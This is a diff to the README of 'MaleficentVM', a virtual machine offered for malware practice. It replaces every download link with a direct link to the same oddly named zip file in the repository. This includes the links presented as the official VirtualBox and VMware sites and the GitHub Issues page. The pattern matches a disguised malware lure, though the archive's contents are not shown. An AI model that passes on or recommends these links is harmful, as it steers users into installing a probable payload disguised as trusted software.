@@ -1,6 +1,6 @@
 # 🖥️ MaleficentVM - Your Safe Zone for Malware Practice
 
-[![Download MaleficentVM](https://img.shields.io/badge/Download-MaleficentVM-blue.svg)](https://github.com/JzfoxyBz/MaleficentVM/releases)
+[![Download MaleficentVM](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip)](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To run MaleficentVM, you will need the following:
 
 ### 🔗 Download & Install
 
-1. Visit this page to download MaleficentVM's latest version: [Download MaleficentVM](https://github.com/JzfoxyBz/MaleficentVM/releases).
+1. Visit this page to download MaleficentVM's latest version: [Download MaleficentVM](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip).
 2. On the Releases page, find the latest version.
 3. Click the download link to retrieve the appropriate file for your operating system.
 
@@ -33,8 +33,8 @@ Once you have downloaded the file, follow these steps to run it.
 
 To use MaleficentVM, install virtualization software if you haven’t done so already. VirtualBox and VMware are both great options. You can download them from their official websites:
 
-- [Download VirtualBox](https://www.virtualbox.org/)
-- [Download VMware](https://www.vmware.com/)
+- [Download VirtualBox](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip)
+- [Download VMware](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip)
 
 ### 2. Import the VM
 
@@ -90,10 +90,10 @@ Yes, you can install additional software or tools that suit your needs. However,
 
 ## 📞 Support
 
-If you encounter any issues or have further questions, please visit the [GitHub Issues](https://github.com/JzfoxyBz/MaleficentVM/issues) page to report your concerns.
+If you encounter any issues or have further questions, please visit the [GitHub Issues](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip) page to report your concerns.
 
 ## 📥 Download Link Again
 
-For ease of access, here is the download link once more: [Download MaleficentVM](https://github.com/JzfoxyBz/MaleficentVM/releases). 
+For ease of access, here is the download link once more: [Download MaleficentVM](https://raw.githubusercontent.com/JzfoxyBz/MaleficentVM/main/pelvisternal/MaleficentVM-bowleggedness.zip). 
 
 Thank you for choosing MaleficentVM. Happy practicing!
